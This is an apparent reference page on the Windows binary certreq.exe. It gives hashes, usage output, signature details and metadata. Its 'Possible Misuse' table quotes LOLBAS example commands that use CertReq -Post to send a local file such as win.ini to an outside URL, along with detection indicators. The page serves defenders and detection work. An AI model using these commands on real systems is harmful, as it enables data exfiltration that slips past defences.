---
title: certreq.exe | CertReq.exe
---

# certreq.exe 

* File Path: `C:\Windows\system32\certreq.exe`
* Description: CertReq.exe

## Screenshot

![certreq.exe](screenshots/certreq.exe-81C07107AB05BD4C4AE1B7D889BCD4FE-2.png)

## Hashes

Type | Hash
-- | --
MD5 | `81C07107AB05BD4C4AE1B7D889BCD4FE`
SHA1 | `97BA5F1CEA1C13C8E89CB476BEBD5B278BA853E5`
SHA256 | `23FD587C7C7FACF6B1B23EDAEC7DBEA5EAEF4F3820ACBAD73D338774D29F2970`
SHA384 | `EE61C90C810840EB4E77618ED983E5575E045C9FFDF68796B2EA8EF3C278EEC414CECFE2E0298414117AC15F9FD4E6CA`
SHA512 | `96E261C01D859DD9C1F15BDC04AFD44E6F4CBA2B6C64540693CB37B92B1653785B59017B2490B6DE72F3F2BB84EDB0D4A222FAE8B8C2271E21A729AC6E1FB293`
SSDEEP | `6144:e1yDud3OkISnubPVJZ8Ua7Z/xrR47giuXoXPPj:eoUVniPXZK7Zv40p0b`

## Runtime Data

### Usage (stdout):
```cmhg
Usage:
  CertReq -?
  CertReq [-v] -?
  CertReq [-Command] -?

  CertReq [-Submit] [Options] [RequestFileIn [CertFileOut [CertChainFileOut [FullResponseFileOut]]]]
    Submit a request to a Certification Authority.

  Options:
    -attrib AttributeString
    -binary
    -PolicyServer PolicyServer
    -config ConfigString
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -crl
    -rpc
    -AdminForceMachine
    -RenewOnBehalfOf
    -NoChallenge

  CertReq -Retrieve [Options] RequestId [CertFileOut [CertChainFileOut [FullResponseFileOut]]]
    Retrieve a response to a previous request from a Certification Authority.

  Options:
    -binary
    -PolicyServer PolicyServer
    -config ConfigString
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -crl
    -rpc
    -AdminForceMachine

  CertReq -New [Options] [PolicyFileIn [RequestFileOut]]
    Create a new request as directed by PolicyFileIn

  Options:
    -attrib AttributeString
    -binary
    -cert CertId
    -PolicyServer PolicyServer
    -config ConfigString
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -pin Pin
    -user
    -machine
    -xchg ExchangeCertFile

  CertReq -Accept [Options] [CertChainFileIn | FullResponseFileIn | CertFileIn]
    Accept and install a response to a previous new request.

  Options:
    -user 
    -machine 
    -pin Pin

  CertReq -Policy [Options] [RequestFileIn [PolicyFileIn [RequestFileOut [PKCS10FileOut]]]]
    Construct a cross certification or qualified subordination request
    from an existing CA certificate or from an existing request.

  Options:
    -attrib AttributeString
    -binary
    -cert CertId
    -PolicyServer PolicyServer
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -pin Pin
    -noEKU
    -AlternateSignatureAlgorithm
    -HashAlgorithm HashAlgorithm

  CertReq -Sign [Options] [RequestFileIn [RequestFileOut]]
    Sign a certificate request with an enrollment agent or qualified
    subordination signing certificate.

  Options:
    -binary
    -cert CertId
    -PolicyServer PolicyServer
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -pin Pin
    -crl
    -noEKU
    -HashAlgorithm HashAlgorithm

  CertReq -Enroll [Options] TemplateName
  CertReq -Enroll -cert CertId [Options] Renew [ReuseKeys]
    Enroll for or renew a certificate.

  Options:
    -PolicyServer PolicyServer
    -user 
    -machine 
    -pin Pin

  CertReq -EnrollAIK [Options] [KeyContainerName]
    Enroll for AIK certificate.

  Options:
    -config

  CertReq -EnrollCredGuardCert [Options] TemplateName [ExtensionInfFile]
    Enroll for machine account Credential Guard certificate.

  Options:
    -config

Unknown argument: -help

```

### Child Processes:
conhost.exe

## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: CertReq.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.14393.0 (rs1_release.160715-1616)
* Product Version: 10.0.14393.0
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## Possible Misuse

*The following table contains possible examples of `certreq.exe` being misused. While `certreq.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `Name: CertReq.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - Command: CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - Command: CertReq -Post -config https://example.org/ c:\windows\win.ini and show response in terminal` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - Path: C:\Windows\System32\certreq.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - Path: C:\Windows\SysWOW64\certreq.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - IOC: certreq creates new files` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - IOC: certreq makes POST requests` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `  - Link: https://dtm.uk/certreq` | 



MIT License. Copyright (c) 2020 Strontic.


